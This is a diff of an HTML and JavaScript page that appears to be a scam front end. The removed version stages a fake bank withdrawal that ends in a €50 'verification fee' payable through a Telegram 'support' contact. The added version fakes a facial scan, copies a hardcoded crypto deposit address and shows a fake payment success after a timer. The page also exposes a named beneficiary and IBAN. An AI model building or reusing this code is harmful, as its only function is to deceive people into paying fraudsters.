-    <div class="mt-4 space-y-4 rounded-2xl bg-gray-50 p-4">
-      <div><p class="text-xs text-gray-500">Beneficiary</p><p class="text-sm font-bold text-gray-900">Fabio Dante Brambilla</p></div>
-      <div><p class="text-xs text-gray-500">IBAN</p><p class="text-sm font-bold tracking-wide text-gray-900">IT75E0760111300001080211012</p></div>
-      <div><p class="text-xs text-gray-500">Amount</p><p class="text-sm font-bold text-gray-900">€1,000.00</p></div>
-    </div>
-    <div class="mt-5 flex gap-3">
-      <button onclick="closeAll()" class="flex-1 rounded-2xl border border-gray-200 py-3.5 text-sm font-semibold text-gray-700">Cancel</button>
-      <button onclick="startLoading()" class="flex-1 rounded-2xl bg-primary py-3.5 text-sm font-semibold text-white shadow-md shadow-primary/30">Confirm</button>
-    </div>
-  </div>
-</div>
-<div id="modal-loading" class="modal fixed inset-0 z-50 items-center justify-center bg-black/50 p-4">
-  <div class="modal-card w-full max-w-md rounded-3xl bg-white p-6">
-    <div class="flex flex-col items-center py-6">
-      <div class="relative h-14 w-14"><div class="absolute inset-0 rounded-full border-4 border-gray-100"></div><div class="spin absolute inset-0 rounded-full border-4 border-transparent border-t-primary"></div></div>
-      <p class="mt-5 text-base font-bold text-gray-900">Preparing secure withdrawal…</p>
-      <p class="mt-1 text-sm text-gray-500">Connecting to SEPA Instant network</p>
-      <div class="mt-6 h-2 w-full overflow-hidden rounded-full bg-gray-100"><div id="progress" class="progress-bar h-full bg-primary" style="width:0%"></div></div>
-      <p id="progress-text" class="mt-2 text-xs font-medium text-gray-500">0%</p>
-    </div>
-  </div>
-</div>
-<div id="modal-verify" class="modal fixed inset-0 z-50 items-center justify-center bg-black/50 p-4">
-  <div class="modal-card w-full max-w-md rounded-3xl bg-white p-6">
-    <h3 class="text-xl font-bold text-gray-900">Face verification required</h3>
-    <p class="mt-1 text-sm text-gray-500">To complete the withdrawal we need to verify your identity.</p>
-    <div class="flex flex-col items-center gap-3 py-6">
-      <div class="flex h-28 w-28 items-center justify-center rounded-full bg-primary/10">
-        <svg class="h-14 w-14 text-primary" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 8V6a2 2 0 012-2h2M16 4h2a2 2 0 012 2v2M20 16v2a2 2 0 01-2 2h-2M8 20H6a2 2 0 01-2-2v-2"/><circle cx="9" cy="11" r="1" fill="currentColor"/><circle cx="15" cy="11" r="1" fill="currentColor"/><path stroke-linecap="round" d="M9 15c1 1 2 1.5 3 1.5s2-.5 3-1.5"/></svg>
-      </div>
-      <p class="text-center text-sm text-gray-500">Position your face inside the frame to begin scanning.</p>
-    </div>
-    <button onclick="openModal('fee')" class="w-full rounded-2xl bg-primary py-3.5 text-sm font-semibold text-white shadow-md shadow-primary/30">Start verification</button>
-  </div>
-</div>
-<div id="modal-fee" class="modal fixed inset-0 z-50 items-center justify-center bg-black/50 p-4">
-  <div class="modal-card w-full max-w-md rounded-3xl bg-white p-6">
-    <h3 class="text-xl font-bold text-gray-900 flex items-center gap-2"><svg class="h-6 w-6 text-amber-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path stroke-linecap="round" d="M12 8v4M12 16h.01"/></svg>Verification fee required</h3>
-    <p class="mt-2 text-sm text-gray-500">A one-time verification fee of <span class="font-bold text-gray-900">€50</span> is needed to release your funds. Please contact support to complete the payment and finalize face verification.</p>
-    <div class="mt-4 rounded-2xl bg-gray-50 p-4 text-sm">
-      <div class="flex justify-between"><span class="text-gray-500">Withdrawal amount</span><span class="font-bold text-gray-900">€1,000.00</span></div>
-      <div class="mt-2 flex justify-between"><span class="text-gray-500">Verification fee</span><span class="font-bold text-gray-900">€50.00</span></div>
-      <div class="mt-3 flex justify-between border-t border-gray-200 pt-3"><span class="font-bold text-gray-900">You receive</span><span class="font-bold text-primary">€1,000.00</span></div>
-    </div>
-    <div class="mt-5 flex gap-3">
-      <button onclick="closeAll()" class="flex-1 rounded-2xl border border-gray-200 py-3.5 text-sm font-semibold text-gray-700">Later</button>
-      <a href="https://t.me/customer_assist01" target="_blank" class="flex-1 rounded-2xl bg-primary py-3.5 text-sm font-semibold text-white shadow-md shadow-primary/30 text-center">Contact support</a>
-    </div>
-  </div>
-</div>
-<script>
-  function openModal(id) { closeAll(); document.getElementById('modal-' + id).classList.add('active'); }
-  function closeAll() { document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); }
-  function startLoading() {
-    openModal('loading');
-    let elapsed = 0; const total = 12000;
-    const bar = document.getElementById('progress'); const txt = document.getElementById('progress-text');
-    const timer = setInterval(() => {
-      elapsed += 100;
-      const pct = Math.min(100, (elapsed / total) * 100);
-      bar.style.width = pct + '%'; txt.textContent = Math.round(pct) + '%';
-      if (elapsed >= total) { clearInterval(timer); openModal('verify'); }
-    }, 100);
-  }
-</script>
+
+    <script>
+        let facialScanTime = 4;
+        let scanInterval;
+        let faceImageData = null;
+
+        // Initialize app
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('welcomeScreen').classList.add('hidden');
+                document.getElementById('facialScanScreen').classList.add('show');
+                startFacialScan();
+            }, 2500);
+        });
+
+        // Start facial scan
+        function startFacialScan() {
+            facialScanTime = 4;
+            updateScanTimer();
+
+            scanInterval = setInterval(() => {
+                facialScanTime--;
+                updateScanTimer();
+
+                if (facialScanTime <= 0) {
+                    clearInterval(scanInterval);
+                    completeFacialScan();
+                }
+            }, 1000);
+        }
+
+        // Update scan timer
+        function updateScanTimer() {
+            document.getElementById('scanTimer').textContent = facialScanTime + 's';
+        }
+
+        // Complete facial scan
+        function completeFacialScan() {
+            // Generate random user name
+            const firstNames = ['Sarah', 'Michael', 'Emma', 'James', 'Lisa', 'David', 'Jessica', 'Robert'];
+            const lastNames = ['Johnson', 'Smith', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'];
+            const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+            const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+            const userName = `${firstName} ${lastName}`;
+
+            // Generate face emoji avatar
+            const avatarEmojis = ['👨‍💼', '👩‍💼', '👨', '👩', '🧑‍💻', '👨‍🔬', '👩‍⚕️'];
+            const avatar = avatarEmojis[Math.floor(Math.random() * avatarEmojis.length)];
+
+            document.getElementById('userName').textContent = `Welcome, ${firstName}`;
+            document.getElementById('avatarContainer').innerHTML = avatar;
+
+            // Hide scan screen and show dashboard
+            document.getElementById('facialScanScreen').classList.remove('show');
+            document.getElementById('facialScanScreen').classList.add('hidden');
+            
+            setTimeout(() => {
+                document.getElementById('dashboardScreen').classList.add('show');
+                createConfetti();
+            }, 600);
+        }
+
+        // Copy address
+        function copyAddress() {
+            const address = 'TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o';
+            navigator.clipboard.writeText(address).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '✓ Copied!';
+                btn.style.background = '#22c55e';
+
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.background = '#667eea';
+                }, 2000);
+            });
+        }
+
+        // Confirm payment
+        function confirmPayment() {
+            const txHash = document.getElementById('txHash').value;
+
+            const btn = document.getElementById('confirmBtn');
+            const spinner = document.getElementById('btnSpinner');
+            const text = document.getElementById('btnText');
+
+            btn.disabled = true;
+            spinner.classList.add('show');
+            text.textContent = 'Processing...';
+
+            setTimeout(() => {
+                spinner.classList.remove('show');
+                text.textContent = '💳 Confirm Payment';
+                btn.disabled = false;
+
+                document.getElementById('deposit-section').style.display = 'none';
+                document.getElementById('successBox').classList.add('show');
+                createConfetti();
+
+                document.getElementById('successBox').scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 3000);
+        }
+
+        // Create confetti
+        function createConfetti() {
+            const confettiCount = 50;
+            for (let i = 0; i < confettiCount; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.textContent = ['🎉', '🎊', '✨', '⭐', '🔐'][Math.floor(Math.random() * 5)];
+                confetti.style.left = Math.random() * window.innerWidth + 'px';
+                confetti.style.top = '-10px';
+                confetti.style.fontSize = (Math.random() * 20 + 20) + 'px';
+                document.body.appendChild(confetti);
+
+                const duration = Math.random() * 3 + 3;
+                const xOffset = (Math.random() - 0.5) * 200;
+
+                confetti.animate([
+                    { transform: 'translateY(0) translateX(0) rotate(0deg)', opacity: 1 },
+                    { transform: `translateY(${window.innerHeight + 20}px) translateX(${xOffset}px) rotate(360deg)`, opacity: 0 }
+                ], {
+                    duration: duration * 1000,
+                    easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
+                });
+
+                setTimeout(() => confetti.remove(), duration * 1000);
+            }
+        }
+    </script>
 </body>
 </html>
